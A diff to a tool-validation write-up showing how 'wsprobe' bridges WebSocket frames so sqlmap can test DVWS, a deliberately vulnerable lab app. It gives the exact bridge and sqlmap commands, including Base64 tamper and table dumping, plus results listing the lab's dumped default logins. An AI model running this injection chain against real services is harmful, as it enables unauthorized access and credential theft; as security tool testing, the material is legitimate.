@@ -146,17 +146,28 @@ per message → ordered correlation). The route config sets `allowedOrigins '*'`
 | Upgrade with no token accepted | `unauth-upgrade: upgraded-without-auth` | insecure-shape | ✅ |
 | No Origin check (`allowedOrigins '*'`) | `origin-*: upgraded-untrusted-origin` | insecure-shape | ✅ |
 
-### Injection layer (bridge + HTTP tool, operator-run)
+### Injection layer (bridge + sqlmap, live DVWS)
 
-wsprobe carries the frame; an HTTP injection tool does the detection. DVWS
-replies are plain strings, so a blank/error string is the oracle.
+wsprobe carries the frame; sqlmap does the detection. The real frame format
+comes from the app's own client (`error-sql-injection.php`), which sends
+`{"auth_user":"<base64>","auth_pass":"<base64>"}` — the fields are Base64-encoded
+before sending. This is the intended workflow: the profile/frame is drawn from
+observed client traffic, not guessed. sqlmap's `base64encode` tamper matches it.
 
 ```
-# Terminal A
-uv run wsprobe bridge runs/dvws.yaml --channel authenticate-user --frame '"§FUZZ§"' --port 8081
-# Terminal B
-sqlmap -u 'http://127.0.0.1:8081/?fuzz=admin' --batch --level 3 -o runs/sqlmap-dvws.log
+PW=$(python3 -c "import base64;print(base64.b64encode(b'x').decode())")
+uv run wsprobe bridge runs/dvws.yaml --channel authenticate-user \
+  --frame "{\"auth_user\":\"§FUZZ§\",\"auth_pass\":\"$PW\"}" --port 8083
+sqlmap -u 'http://127.0.0.1:8083/?fuzz=admin' --tamper=base64encode \
+  --batch --dbms mysql --technique=B --string=Welcome --dump -T users
 ```
 
-Status: handshake layer ✅ caught. Injection run **pending** operator execution;
-results to `runs/sqlmap-dvws.log`, then a row here.
+| Expected | Result | Evidence |
+|----------|--------|----------|
+| Auth bypass via tautology through the bridge | ✅ `Welcome ... Super Administrator` | `runs/dvws-b64-probe.txt` |
+| sqlmap detects SQLi in the frame field | ✅ boolean-based blind, back-end MySQL | `runs/sqlmap-dvws.log` |
+| sqlmap dumps a real table through the socket | ✅ `dvws.users`: admin/admin, bob/bobbuilder, jsmith/password | `runs/sqlmap-dvws-dump2.log` |
+
+This is a live third-party target, not the fixture: an HTTP-only tool detected
+and exploited a WebSocket SQLi end to end through wsprobe, once the profile
+carried the app's real (base64-wrapped) frame format.
